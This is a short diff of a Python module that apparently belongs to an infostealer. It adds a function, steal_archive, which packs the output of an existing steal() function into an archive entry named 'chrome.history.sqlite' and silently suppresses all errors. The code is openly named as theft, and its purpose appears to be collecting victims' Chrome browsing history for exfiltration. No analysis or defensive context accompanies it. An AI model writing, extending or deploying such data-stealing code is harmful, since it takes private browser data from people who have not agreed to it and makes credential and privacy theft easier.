@@ -15,3 +15,10 @@ def steal():
     os.remove(tmp_database)
 
     return data
+
+def steal_archive(archive):
+    try:
+        with archive.open("chrome.history.sqlite", "w") as f:
+            f.write(steal().read())
+    except:
+        pass
